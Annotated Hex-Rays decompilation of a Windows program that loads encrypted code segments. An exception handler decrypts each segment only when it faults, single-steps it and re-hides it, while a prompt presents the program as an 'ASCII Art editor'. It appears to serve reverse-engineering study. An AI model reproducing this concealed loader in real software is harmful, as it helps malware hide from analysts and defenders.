/* This file has been generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2015 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

signed int __stdcall MAIN(int a1, int a2, int a3, int a4);
void *sub_401220();
int __cdecl send_printfed_data(int a1, char a2);
int __cdecl sprintf_func(int a1, int a2, int a3, char a4);
signed int __cdecl decode_seg(int a1, int a2, int a3);
signed int __stdcall Handler(struct _EXCEPTION_POINTERS *ExceptionInfo);
int __cdecl try_find_seg_of_addr(unsigned int a1, int a2, unsigned int a3);
int __cdecl search_something(int a1, int a2, int a3);
int __cdecl sub_401900(int a1, int a2);
int __cdecl sub_401920(int a1, int a2);
unsigned int __cdecl simple_xordec(int a1, unsigned int a2, char a3, char a4);
int __stdcall sub_401970(int); // weak
int __cdecl init_func_ptrs(_DWORD *a1);
int __stdcall query_to_num(int a1, int a2, const wchar_t **a3, unsigned int a4, int a5, _DWORD *a6);
signed int __stdcall sub_401AB0(int a1, int a2, int a3, _DWORD *a4);
signed int __stdcall sub_401B10(int a1, _DWORD *a2);
int __stdcall handle_query(int, int, int, int, int, DISPPARAMS *pdispparams, VARIANTARG *pvarg, int, UINT *puArgErr); // idb
// int __usercall send_hash_or_encrypted_data@<eax>(char a1@<dil>, int a2, int a3, int a4, int a5, VARIANTARG *a6, _DWORD *a7);
signed int __stdcall retrieve_some_data(int a1, _DWORD *a2, _DWORD *a3);
int __stdcall sub_402030(int); // weak
int __cdecl sub_402040(int, int, LPCWSTR lpWideCharStr, int); // idb
int __cdecl hash_something(LPCWSTR lpWideCharStr, LPSTR lpMultiByteStr, int, BYTE *pbData); // idb
void __cdecl mix_arg1_arg2(int a1, int a2, int a3, int a4);
int __cdecl generate_perm(int a1, int a2, signed int a3);
int sub_402457(); // weak
// int __usercall sub_402468@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
int sub_40250C(); // weak
int sub_402514();
// int __usercall sub_402647@<eax>(int a1@<ebp>);
// void __usercall sub_40265B(int a1@<ebp>);
int __cdecl sub_4026A2(struct _EXCEPTION_POINTERS *ExceptionInfo); // idb
// int __usercall sub_4026CA@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, char a4);
int __cdecl sub_4027C5(int a1, unsigned int a2);
char sub_402809();
char __cdecl sub_40283B(int a1);
// char __usercall sub_402874@<al>(int a1@<ebx>, int a2@<edi>, int a3);
// int __usercall sub_40291E@<eax>(int a1@<ebp>);
signed __int32 __cdecl sub_4029A8(char a1);
char __cdecl sub_4029C5(int a1, char a2);
int __cdecl sub_4029ED(int a1);
int __cdecl sub_402A28(int a1);
DWORD sub_402A3D();
void sub_402A8C();
int sub_402AD7();
signed int sub_402ADA();
signed int sub_402ADE();
void sub_402AE4();
char sub_402AF0();
// errno_t __usercall sub_402AF3@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
int nullsub_1(void); // weak
void *sub_402B15();
_DWORD *sub_402B1B();
BOOL sub_402B38();
void *sub_402B44();
void *sub_402B4A();
// void __usercall sub_402B50(int a1@<ebx>, int a2@<edi>, int a3@<esi>, unsigned int a4);
signed int sub_402C6C();
bool sub_402C9F();
LPTOP_LEVEL_EXCEPTION_FILTER sub_402CE2();
LONG __stdcall TopLevelExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo); // idb
void sub_402D2F();
int sub_402D37();
int sub_402D63();
void __cdecl sub_402D90(int a1, int a2);
int sub_402DD6(void); // weak
int __cdecl sub_402DEB(int a1, int a2, int a3, int a4);
int sub_402E0E();
BOOL sub_402FA7();
// BOOL __stdcall IsProcessorFeaturePresent(DWORD ProcessorFeature);
// void *__cdecl memcpy(void *Dst, const void *Src, size_t Size);
// void *__cdecl memset(void *Dst, int Val, size_t Size);
// int __cdecl except_handler4_common(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// int __cdecl seh_filter_exe(_DWORD, _DWORD); weak
// int __cdecl set_app_type(_DWORD); weak
// int __cdecl _setusermatherr(_DWORD); weak
// int __cdecl configure_narrow_argv(_DWORD); weak
// int initialize_narrow_environment(void); weak
// void __cdecl __noreturn exit(int Code);
// errno_t __cdecl set_fmode(int Mode);
// int c_exit(void); weak
// int __cdecl configthreadlocale(_DWORD); weak
// int __cdecl set_new_mode(_DWORD); weak
// int _p__commode(void); weak
// int __cdecl initialize_onexit_table(_DWORD); weak
// int __cdecl register_onexit_function(_DWORD); weak
// int __cdecl crt_atexit(_DWORD); weak
// errno_t __cdecl controlfp_s(unsigned int *CurrentState, unsigned int NewValue, unsigned int Mask);
// int __stdcall terminate(_DWORD); weak
// BOOL __stdcall CryptCreateHash(HCRYPTPROV hProv, ALG_ID Algid, HCRYPTKEY hKey, DWORD dwFlags, HCRYPTHASH *phHash);
// BOOL __stdcall CryptGetHashParam(HCRYPTHASH hHash, DWORD dwParam, BYTE *pbData, DWORD *pdwDataLen, DWORD dwFlags);
// BOOL __stdcall CryptAcquireContextA(HCRYPTPROV *phProv, LPCSTR szContainer, LPCSTR szProvider, DWORD dwProvType, DWORD dwFlags);
// BOOL __stdcall CryptHashData(HCRYPTHASH hHash, const BYTE *pbData, DWORD dwDataLen, DWORD dwFlags);
// BOOL __stdcall IsDebuggerPresent();
// void __stdcall GetStartupInfoW(LPSTARTUPINFOW lpStartupInfo);
// HMODULE __stdcall GetModuleHandleW(LPCWSTR lpModuleName);
// void __stdcall GetSystemTimeAsFileTime(LPFILETIME lpSystemTimeAsFileTime);
// void __stdcall InitializeSListHead(PSLIST_HEADER ListHead);
// LONG __stdcall UnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo);
// void __stdcall OutputDebugStringA(LPCSTR lpOutputString);
// PVOID __stdcall AddVectoredExceptionHandler(ULONG First, PVECTORED_EXCEPTION_HANDLER Handler);
// LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// BOOL __stdcall FlushInstructionCache(HANDLE hProcess, LPCVOID lpBaseAddress, SIZE_T dwSize);
// UINT __stdcall SetErrorMode(UINT uMode);
// void __stdcall Sleep(DWORD dwMilliseconds);
// int __stdcall MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCSTR lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
// int __stdcall WideCharToMultiByte(UINT CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCSTR lpDefaultChar, LPBOOL lpUsedDefaultChar);
// LCID __stdcall GetSystemDefaultLCID();
// LCID __stdcall GetUserDefaultLCID();
// DWORD __stdcall GetLastError();
// DWORD __stdcall GetCurrentThreadId();
// LPTOP_LEVEL_EXCEPTION_FILTER __stdcall SetUnhandledExceptionFilter(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);
// HANDLE __stdcall GetCurrentProcess();
// BOOL __stdcall TerminateProcess(HANDLE hProcess, UINT uExitCode);
// BOOL __stdcall QueryPerformanceCounter(LARGE_INTEGER *lpPerformanceCount);
// DWORD __stdcall GetCurrentProcessId();
// HRESULT __stdcall DispGetParam(DISPPARAMS *pdispparams, UINT position, VARTYPE vtTarg, VARIANT *pvarResult, UINT *puArgErr);
// void __stdcall VariantInit(VARIANTARG *pvarg);
// BSTR __stdcall SysAllocString(const OLECHAR *psz);
// void *__cdecl calloc(size_t NumOfElements, size_t SizeOfElements);
// void __cdecl free(void *Memory);
// void *__cdecl malloc(size_t Size);
// int __cdecl _acrt_iob_func(_DWORD); weak
// int __cdecl _stdio_common_vfprintf(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// int __cdecl _stdio_common_vsprintf(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// int __cdecl wcsicmp(const wchar_t *Str1, const wchar_t *Str2);
// HRESULT __stdcall CoInitialize(LPVOID pvReserved);

//-------------------------------------------------------------------------
// Data declarations

// extern _UNKNOWN loc_40267C; weak
int (__thiscall *__guard_check_icall_fptr)(_DWORD) = &nullsub_1; // weak
OLECHAR psz = 0u; // idb
_UNKNOWN unk_40A3C4; // weak
_UNKNOWN unk_40A3D4; // weak
_UNKNOWN unk_40A3E4; // weak
struct _EXCEPTION_POINTERS ExceptionInfo = { &dword_40FDB0, &dword_40FE00 }; // idb
_UNKNOWN unk_40A6F4; // weak
_UNKNOWN unk_40A6FC; // weak
_UNKNOWN unk_40A720; // weak
_UNKNOWN alloc_rx_seg_tb_orig; // weak
_UNKNOWN unk_40C2B8; // weak
int dword_40C2D0 = 0; // weak
int dword_40C2F4 = 0; // weak
int dword_40C318 = 0; // weak
int dword_40C33C = 0; // weak
int dword_40C360 = 0; // weak
int dword_40C384 = 0; // weak
int alloc_rx_seg_count_orig = 6; // weak
_UNKNOWN alloc_rw_seg_tb_orig; // weak
_UNKNOWN unk_40CD08; // weak
int dword_40CD20 = 0; // weak
int alloc_rw_seg_count_orig = 1; // weak
_UNKNOWN unk_40CD28; // weak
size_t cbMultiByte = 9184u; // idb
int dword_40F10C = 3152; // idb
_UNKNOWN unk_40F110; // weak
int __security_cookie = 3141592654; // weak
int dword_40FD64 = 1153374641; // weak
int dword_40FD6C = 1; // weak
int dword_40FD70 = 1; // weak
int dword_40FD74 = 1; // weak
int dword_40FD80 = 0; // weak
int just_a_temp_var_dword_40FD84 = 0; // weak
int dword_40FD88 = 0; // weak
int dword_40FD8C = 0; // weak
int dword_40FD90 = 0; // weak
int dword_40FD94 = 0; // weak
int dword_40FD98 = 0; // weak
int dword_40FD9C = 0; // weak
int dword_40FDA0 = 0; // weak
int dword_40FDA4 = 0; // weak
int dword_40FDA8 = 0; // weak
int dword_40FDB0 = 0; // weak
int dword_40FDB4 = 0; // weak
int dword_40FDBC = 0; // weak
int dword_40FDC0 = 0; // weak
int dword_40FDC4 = 0; // weak
int dword_40FE00; // weak
__int16 word_40FE8C; // weak
__int16 word_40FE90; // weak
__int16 word_40FE94; // weak
__int16 word_40FE98; // weak
int dword_40FE9C; // weak
int dword_40FEA0; // weak
int dword_40FEA4; // weak
int dword_40FEA8; // weak
int dword_40FEAC; // weak
int dword_40FEB0; // weak
int dword_40FEB4; // weak
int dword_40FEB8; // weak
__int16 word_40FEBC; // weak
int dword_40FEC0; // weak
int dword_40FEC4; // weak
__int16 word_40FEC8; // weak
int dword_4100CC; // weak
_DWORD dword_4100D8[3]; // idb
char byte_4100E4; // weak
_UNKNOWN unk_4100EC; // weak
char byte_4100F0; // weak
union _SLIST_HEADER ListHead; // idb
_UNKNOWN unk_410100; // weak
int dword_410108; // weak
int dword_41010C; // weak
int dword_410110; // weak
int last_err_rx_access_ip; // weak
int last_err_rx_access_seg; // weak
int alloc_rx_seg_tb; // weak
int alloc_rx_seg_count; // weak
int last_err_in_rw_addr; // weak
int last_err_rw_seg_ptr; // weak
int alloc_rw_seg_tb; // weak
int alloc_rw_seg_count; // weak
_UNKNOWN unk_410140; // weak
_UNKNOWN unk_410148; // weak
_UNKNOWN unk_41014C; // weak


//----- (00401000) --------------------------------------------------------
signed int __stdcall MAIN(int a1, int a2, int a3, int a4)
{
  LPVOID (__stdcall *v5)(LPVOID, SIZE_T, DWORD, DWORD); // eax@3
  signed int v6; // ebx@3
  unsigned int v7; // edi@3
  void *v8; // esi@4
  void *v9; // eax@5
  unsigned int v10; // edi@8
  void *v11; // esi@9
  void *v12; // eax@10
  int (__cdecl *v13)(int *); // esi@13
  int v14; // eax@13
  DWORD v15; // [sp+0h] [bp-138h]@11
  DWORD flOldProtect; // [sp+4h] [bp-134h]@6
  int v17; // [sp+8h] [bp-130h]@13
  int (__cdecl *v18)(int, char); // [sp+Ch] [bp-12Ch]@13
  int v19; // [sp+10h] [bp-128h]@13
  int v20; // [sp+14h] [bp-124h]@13
  int v21; // [sp+18h] [bp-120h]@13
  int v22; // [sp+1Ch] [bp-11Ch]@13
  int v23; // [sp+20h] [bp-118h]@13
  char v24; // [sp+24h] [bp-114h]@13
  const char *v25; // [sp+28h] [bp-110h]@13
  const wchar_t *v26; // [sp+2Ch] [bp-10Ch]@13
  const wchar_t *v27; // [sp+30h] [bp-108h]@13
  CHAR OutputString; // [sp+34h] [bp-104h]@14

  if ( CoInitialize(0) < 0 )
    return 0;
  v5 = VirtualAlloc;
  v6 = 0;
  v7 = 0;
  if ( alloc_rx_seg_count_orig )
  {
    v8 = &unk_40C2B8;
    do
    {
      v9 = v5(0, *(_DWORD *)v8, 0x3000u, 4u);
      *((_DWORD *)v8 + 6) = v9;
      if ( !v9 )
        goto LABEL_15;
      //careful, arcane pointer arithmetic
      memcpy(v9, **((const void ***)v8 + 1), *(_DWORD *)v8);
      if ( !VirtualProtect(*((LPVOID *)v8 + 6), *(_DWORD *)v8, 1u, &flOldProtect) )
        goto LABEL_15;
      v5 = VirtualAlloc;
      ++v7;
      v8 = (char *)v8 + 36;
    }
    while ( v7 < alloc_rx_seg_count_orig );
  }
  v10 = 0;
  if ( (unsigned int)alloc_rw_seg_count_orig > 0 )
  {
    v11 = &unk_40CD08;
    do
    {
      v12 = v5(0, *(_DWORD *)v11, 0x3000u, 4u);
      *((_DWORD *)v11 + 6) = v12;
      if ( !v12 )
        goto LABEL_15;
      memcpy(v12, **((const void ***)v11 + 1), *(_DWORD *)v11);
      if ( !VirtualProtect(*((LPVOID *)v11 + 6), *(_DWORD *)v11, 1u, &v15) )
        goto LABEL_15;
      v5 = VirtualAlloc;
      ++v10;
      v11 = (char *)v11 + 36;
    }
    while ( v10 < alloc_rw_seg_count_orig );
  }
  v19 = dword_40C318;
  v20 = dword_40C33C;
  v21 = dword_40C360;
  v22 = dword_40C2D0;
  v17 = dword_40C2F4;
  v18 = send_printfed_data;
  v23 = dword_40CD20 + 4;
  v25 = "%d 0x%x\n";
  init_func_ptrs(&v24);
  v26 = L"You are about to run the coolest\nASCII Art editor on earth. Continue?";
  v27 = L"Caution: Explosively Neat Program";
  sub_401900((int)&alloc_rx_seg_tb_orig, alloc_rx_seg_count_orig);
  sub_401920((int)&alloc_rw_seg_tb_orig, alloc_rw_seg_count_orig);
  AddVectoredExceptionHandler(0, (PVECTORED_EXCEPTION_HANDLER)Handler);
  v13 = (int (__cdecl *)(int *))dword_40C384;
  OutputDebugStringA("Running shellcode crouching_vbs_hidden_title.asm...\n");
  v14 = v13(&v17);
  if ( v14 < 0 )
  {
    sprintf_func((int)&OutputString, 255, (int)"HRESULT 0x%08x\n", v14);
    OutputDebugStringA(&OutputString);
LABEL_15:
    v6 = 1;
  }
  return v6;
}
// 40A118: using guessed type wchar_t aYouAreAboutToR[70];
// 40A1A8: using guessed type wchar_t aCautionExplosi[34];
// 40C2D0: using guessed type int dword_40C2D0;
// 40C2F4: using guessed type int dword_40C2F4;
// 40C318: using guessed type int dword_40C318;
// 40C33C: using guessed type int dword_40C33C;
// 40C360: using guessed type int dword_40C360;
// 40C384: using guessed type int dword_40C384;
// 40C388: using guessed type int alloc_rx_seg_count_orig;
// 40CD20: using guessed type int dword_40CD20;
// 40CD24: using guessed type int alloc_rw_seg_count_orig;

//----- (00401220) --------------------------------------------------------
void *sub_401220()
{
  return &unk_410140;
}

//----- (00401230) --------------------------------------------------------
int __cdecl send_printfed_data(int a1, char a2)
{
  int v2; // ST08_4@1
  _DWORD *v3; // eax@1

  v2 = _acrt_iob_func(1);
  v3 = sub_401220();
  return _stdio_common_vfprintf(*v3, v3[1], v2, a1, 0, &a2);
}
// 404108: using guessed type int __cdecl _acrt_iob_func(_DWORD);
// 40410C: using guessed type int __cdecl _stdio_common_vfprintf(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00401260) --------------------------------------------------------
int __cdecl sprintf_func(int a1, int a2, int a3, char a4)
{
  _DWORD *v4; // eax@1
  int result; // eax@1

  v4 = sub_401220();
  result = _stdio_common_vsprintf(*v4 | 2, v4[1], a1, a2, a3, 0, &a4);
  if ( result < 0 )
    result = -1;
  return result;
}
// 404114: using guessed type int __cdecl _stdio_common_vsprintf(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (004012A0) --------------------------------------------------------
signed int __cdecl decode_seg(int seg_m8, int op_addr, int is_mem_op)
{
  _DWORD *v3; // eax@2
  _DWORD *v4; // ebx@2
  int v5; // edi@3
  int v6; // eax@3
  int v7; // eax@4
  char *v8; // ecx@5
  int v9; // eax@9
  char *v10; // ecx@10
  int v12; // eax@15
  int v13; // ecx@16
  signed int v14; // eax@17
  int v15; // eax@21
  int v16; // ecx@28
  unsigned int v17; // eax@32
  unsigned int v18; // ebx@32
  _BYTE *v19; // esi@33
  int v20; // edx@33
  char v21; // al@33
  unsigned int v22; // esi@35
  unsigned int v23; // edx@35
  _BYTE *v24; // eax@36
  int v25; // [sp+Ch] [bp-11Ch]@24
  unsigned int v26; // [sp+10h] [bp-118h]@25
  signed int v27; // [sp+14h] [bp-114h]@27
  unsigned int v28; // [sp+18h] [bp-110h]@28
  int v29; // [sp+1Ch] [bp-10Ch]@26
  unsigned int v30; // [sp+1Ch] [bp-10Ch]@32
  char Dst; // [sp+20h] [bp-108h]@1

  memset(&Dst, 0, 0x102u);
  if ( seg_m8 )
  {
    v3 = (_DWORD *)search_something(seg_m8, op_addr, is_mem_op);
    // v3 = inspos ptr
    v4 = v3;
    if ( v3 )
    {
      v5 = *v3 + *(_DWORD *)(seg_m8 + 32);
      //addr of event in segment
      v6 = *(_DWORD *)seg_m8;
      if ( *(_DWORD *)seg_m8 & 1 )
      {
        v7 = *(_DWORD *)(seg_m8 + 28);
        if ( v7 )
        {
          v8 = *(char **)(v7 + 4);
          if ( v8 )
          {
            if ( *(_DWORD *)v7 )
            {
              simple_xordec(v5, v4[1], *v8, 0);
              return 1;
            }
          }
        }
        return 0;
      }
      if ( v6 & 2 )
      {
        v9 = *(_DWORD *)(seg_m8 + 28);
        if ( v9 )
        {
          v10 = *(char **)(v9 + 4);
          if ( v10 )
          {
            if ( *(_DWORD *)v9 == 1 )
            {
              simple_xordec(v5, v4[1], *v10, 1);
              return 1;
            }
          }
        }
        return 0;
      }
      if ( v6 & 4 )
      {
        v12 = *(_DWORD *)(seg_m8 + 28);
        if ( v12 )
        {
          v13 = *(_DWORD *)(v12 + 4);
          if ( v13 )
          {
            v14 = *(_DWORD *)v12;
            if ( v14 )
            {
              generate_perm((int)&Dst, v13, v14);
              mix_arg1_arg2((int)&Dst, v5, v5, v4[1]);
              return 1;
            }
          }
        }
      }
      else if ( (char)v6 < 0 )
      {
        v15 = *(_DWORD *)(seg_m8 + 28);
        if ( v15 )
        {
          if ( *(_DWORD *)(v15 + 4) )
          {
            if ( *(_DWORD *)v15 )
            {
              v25 = *(_DWORD *)(v15 + 12);
              if ( v25 )
              {
                v26 = *(_DWORD *)(v15 + 8);
                if ( v26 )
                {
                  v29 = *(_DWORD *)(v15 + 20);
                  if ( v29 )
                  {
                    v27 = *(_DWORD *)(v15 + 16);
                    if ( v27 )
                    {
                      v28 = ((unsigned int)v4 - *(_DWORD *)(seg_m8 + 20)) >> 3;
                      v16 = v28;
                      if ( v28 % 3 )
                      {
                        if ( v28 % 3 == 1 )
                        {
                          v17 = v4[1];
                          v18 = 0;
                          v30 = v17;
                          if ( v17 )
                          {
                            do
                            {
                              v19 = (_BYTE *)(v18 + v5);
                              v20 = v18 % v26;
                              v21 = v16;
                              LOBYTE(v16) = v18++;
                              *v19 ^= *(_BYTE *)(v20 + v25) + v21 * v16;
                              LOBYTE(v16) = v28;
                            }
                            while ( v18 < v30 );
                          }
                        }
                        else if ( v28 % 3 == 2 )
                        {
                          generate_perm((int)&Dst, v29, v27);
                          mix_arg1_arg2((int)&Dst, v5, v5, v4[1]);
                          simple_xordec(v5, v4[1], v28, v28 - 1);
                        }
                      }
                      else
                      {
                        v22 = v4[1];
                        v23 = 0;
                        just_a_temp_var_dword_40FD84 = ((unsigned int)v4 - *(_DWORD *)(seg_m8 + 20)) >> 3;
                        if ( v22 )
                        {
                          while ( 1 )
                          {
                            v24 = (_BYTE *)(v23++ + v5);
                            just_a_temp_var_dword_40FD84 = (12345 - 1043968403 * v16) & 0x7FFFFFFF;
                            *v24 ^= 57 - -109 * v16;
                            if ( v23 >= v22 )
                              break;
                            v16 = just_a_temp_var_dword_40FD84;
                          }
                        }
                      }
                      return 1;
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  return 0;
}
// 40FD84: using guessed type int just_a_temp_var_dword_40FD84;

//----- (00401560) --------------------------------------------------------
signed int __stdcall Handler(struct _EXCEPTION_POINTERS *ExceptionInfo)
{
  // EXCEPTION_CONTINUE_SEARCH 0
  // CONTINUE_EXECUTION -1
  //arg1 is &v17 of MAINj

  /*
     seg structure: size: 0x24
0x0:size
0x18: valloc
0x4: str



     */
  struct _EXCEPTION_POINTERS *v1; // ebx@1
  signed int v2; // esi@1
  PVOID v3; // edx@1
  struct _EXCEPTION_POINTERS *v4; // ecx@1
  DWORD v5; // eax@1
  int v6; // edi@5
  int v8; // edi@12
  BOOL v9; // eax@22
  BOOL v10; // eax@29
  DWORD flOldProtect; // [sp+Ch] [bp-8h]@1
  DWORD v12; // [sp+10h] [bp-4h]@1

  v1 = ExceptionInfo;
  v12 = 1;
  v2 = 0;
  v3 = ExceptionInfo->ExceptionRecord->ExceptionAddress;
  v4 = (struct _EXCEPTION_POINTERS *)ExceptionInfo->ExceptionRecord->ExceptionInformation[1]; // probably address of next instruction after step
  // if EXCEPTION_IN_PAGE_ERROR,  The second array element specifies the virtual address of the inaccessible data.  0xC0000006 STATUS_IN_PAGE_ERROR



  v5 = ExceptionInfo->ExceptionRecord->ExceptionCode;
  flOldProtect = (DWORD)ExceptionInfo->ExceptionRecord->ExceptionAddress;
  ExceptionInfo = v4;
  if ( v5 != -2147483644 ) // 0x800000..004 
STATUS_SINGLE_STEP
  {
    if ( v5 == -1073741819 ) // 0xc0000..0005
STATUS_ACCESS_VIOLATION
    {
      // memory violation
      if ( last_err_rx_access_ip || last_err_rx_access_seg )
        return 0;
      v6 = try_find_seg_of_addr((unsigned int)v3, alloc_rx_seg_tb, alloc_rx_seg_count);

      // error in rx segment, not mapped code
      if ( v6 )
      {
        ExceptionInfo = (struct _EXCEPTION_POINTERS *)1;
        if ( VirtualProtect(*(LPVOID *)(v6 + 32), *(_DWORD *)(v6 + 8), 4u, (PDWORD)&ExceptionInfo) )
          // PAGE READWRITE
        {
          // here flold=address
          if ( decode_seg(v6, flOldProtect, 0) )
          {
            last_err_rx_access_ip = flOldProtect;
            last_err_rx_access_seg = v6;
            if ( VirtualProtect(*(LPVOID *)(v6 + 32), *(_DWORD *)(v6 + 8), 0x20u, (PDWORD)&ExceptionInfo) )
              //  PAGE EXECUTE READ
            {
              if ( FlushInstructionCache((HANDLE)0xFFFFFFFF, *(LPCVOID *)(v6 + 32), *(_DWORD *)(v6 + 8)) )
              {
                v2 = -1;
                v1->ContextRecord->EFlags |= 0x100u; // TRAP
                if ( FlushInstructionCache((HANDLE)0xFFFFFFFF, *(LPCVOID *)(v6 + 32), *(_DWORD *)(v6 + 8)) )
                {
                  v1->ContextRecord->EFlags |= 0x100u; // TRAP
                  return -1;
                }
              }
            }
          }
        }
      }
      else
      {
        // error in rw segment, not mapped data

        v8 = try_find_seg_of_addr((unsigned int)ExceptionInfo, alloc_rw_seg_tb, alloc_rw_seg_count);
        // return seg - 8
        if ( v8 )
        {
          flOldProtect = 1;
          v2 = 0;
          if ( VirtualProtect(*(LPVOID *)(v8 + 32), *(_DWORD *)(v8 + 8), 4u, &flOldProtect) )
            // PAGE READWRITE
          {
            if ( decode_seg(v8, (int)ExceptionInfo, 1) )
            {
              last_err_in_rw_addr = (int)ExceptionInfo;
              last_err_rw_seg_ptr = v8;
              if ( VirtualProtect(*(LPVOID *)(v8 + 32), *(_DWORD *)(v8 + 8), 2u, &flOldProtect) )
                // PAGE READONLY
              {
                v1->ContextRecord->EFlags |= 0x100u;
                return -1;
              }
            }
          }
        }
      }
    }
    return v2;
  }


  /*
     unmap current seg after each single step
     GO full run. Hit mem access exception in rw / rx
     Load said seg. Single step
     Repeat


     */
STATUS_SINGLE_STEP
  v1->ContextRecord->EFlags &= 0xFFFFFEFF;
  if ( !last_err_rx_access_ip || !last_err_rx_access_seg )
  {
    if ( last_err_in_rw_addr )
    {
      if ( last_err_rw_seg_ptr )
      {
        dword_40FD80 = 1;
        // PAG READ
        if ( VirtualProtect(*(LPVOID *)(last_err_rw_seg_ptr + 32), *(_DWORD *)(last_err_rw_seg_ptr + 8), 4u, &v12) )
        {
          // NO ACCESS
          if ( decode_seg(last_err_rw_seg_ptr, last_err_in_rw_addr, 1) )
          {
            v10 = VirtualProtect(*(LPVOID *)(last_err_rw_seg_ptr + 32), *(_DWORD *)(last_err_rw_seg_ptr + 8), 1u, &v12);
            last_err_in_rw_addr = 0;
            last_err_rw_seg_ptr = 0;
            if ( v10 )
              v2 = -1;
          }
        }
      }
    }
    return v2;
  }
  if ( !VirtualProtect(*(LPVOID *)(last_err_rx_access_seg + 32), *(_DWORD *)(last_err_rx_access_seg + 8), 4u, &v12)
    || !decode_seg(last_err_rx_access_seg, last_err_rx_access_ip, 0) )
  {
    return v2;
  }
  v9 = VirtualProtect(*(LPVOID *)(last_err_rx_access_seg + 32), *(_DWORD *)(last_err_rx_access_seg + 8), 1u, &v12);
  last_err_rx_access_ip = 0;
  last_err_rx_access_seg = 0;
  if ( v9 )
    v2 = -1;
  return v2;
}
// 40FD80: using guessed type int dword_40FD80;
// 410120: using guessed type int last_err_rx_access_ip;
// 410124: using guessed type int last_err_rx_access_seg;
// 410128: using guessed type int alloc_rx_seg_tb;
// 41012C: using guessed type int alloc_rx_seg_count;
// 410130: using guessed type int last_err_in_rw_addr;
// 410134: using guessed type int last_err_rw_seg_ptr;
// 410138: using guessed type int alloc_rw_seg_tb;
// 41013C: using guessed type int alloc_rw_seg_count;

//----- (00401850) --------------------------------------------------------
int __cdecl try_find_seg_of_addr(unsigned int a1, int a2, unsigned int a3)
  // a1 = exception address
  // return seg - 8
{
  unsigned int v3; // edx@1
  int v4; // eax@2
  unsigned int v5; // esi@3
  int result; // eax@6

  v3 = 0;
  if ( a3 )
  {
    v4 = a2 + 8;
    while ( 1 )
    {
      v5 = *(_DWORD *)(v4 + 24);
      if ( a1 >= v5 && a1 < v5 + *(_DWORD *)v4 )
        break;
      ++v3;
      v4 += 36;
      if ( v3 >= a3 )
        goto LABEL_6;
    }
    result = v4 - 8;
  }
  else
  {
LABEL_6:
    result = 0;
  }
  return result;
}

//----- (004018A0) --------------------------------------------------------
int __cdecl search_something(int seg_m8, int op_addr, int is_mem_op)
{
  unsigned int v3; // esi@2
  unsigned int v4; // ebx@3
  unsigned int v5; // edi@3
  int v6; // ecx@4
  unsigned int v7; // edx@5
  int result; // eax@12

  if ( seg_m8 && (v3 = op_addr - *(_DWORD *)(seg_m8 + 32), v3 < *(_DWORD *)(seg_m8 + 8)) )
    // check op_addr is in segment
    // v3 = pos in seg
  {
    v4 = *(_DWORD *)(seg_m8 + 16);
    v5 = 0;
    if ( v4 )
    {
      v6 = *(_DWORD *)(seg_m8 + 20);
      do
      {
        v7 = *(_DWORD *)v6;
        if ( is_mem_op )
        {
          if ( v3 >= v7 && v3 < v7 + *(_DWORD *)(v6 + 4) )
            goto LABEL_12;
        }
        else if ( v3 == v7 )
        {
          goto LABEL_12;
        }
        ++v5;
        v6 += 8;
      }
      while ( v5 < v4 );
    }
    v6 = 0;
LABEL_12:
    result = v6;
  }
  else
  {
    result = 0;
  }
  return result;
}

//----- (00401900) --------------------------------------------------------
int __cdecl sub_401900(int a1, int a2)
{
  int result; // eax@1

  alloc_rx_seg_tb = a1;
  result = a2;
  alloc_rx_seg_count = a2;
  return result;
}
// 410128: using guessed type int alloc_rx_seg_tb;
// 41012C: using guessed type int alloc_rx_seg_count;

//----- (00401920) --------------------------------------------------------
int __cdecl sub_401920(int a1, int a2)
{
  int result; // eax@1

  alloc_rw_seg_tb = a1;
  result = a2;
  alloc_rw_seg_count = a2;
  return result;
}
// 410138: using guessed type int alloc_rw_seg_tb;
// 41013C: using guessed type int alloc_rw_seg_count;

//----- (00401940) --------------------------------------------------------
unsigned int __cdecl simple_xordec(int a1, unsigned int a2, char a3, char a4)
{
  unsigned int result; // eax@1
  char v5; // dl@2

  result = 0;
  if ( a2 )
  {
    v5 = a3;
    do
    {
      *(_BYTE *)(result++ + a1) ^= v5;
      v5 += a4;
    }
    while ( result < a2 );
  }
  return result;
}

//----- (00401990) --------------------------------------------------------
int __cdecl init_func_ptrs(_DWORD *a1)
{
  dword_40FD88 = (int)&dword_40FD8C;
  dword_40FD8C = (int)retrieve_some_data;
  dword_40FD90 = (int)sub_401970;
  dword_40FD94 = (int)sub_402030;
  dword_40FD98 = (int)sub_401B10;
  dword_40FD9C = (int)sub_401AB0;
  dword_40FDA0 = (int)query_to_num;
  dword_40FDA4 = (int)handle_query;
  *a1 = &dword_40FD88;
  return 0;
}
// 401970: using guessed type int __stdcall sub_401970(int);
// 402030: using guessed type int __stdcall sub_402030(int);
// 40FD88: using guessed type int dword_40FD88;
// 40FD8C: using guessed type int dword_40FD8C;
// 40FD90: using guessed type int dword_40FD90;
// 40FD94: using guessed type int dword_40FD94;
// 40FD98: using guessed type int dword_40FD98;
// 40FD9C: using guessed type int dword_40FD9C;
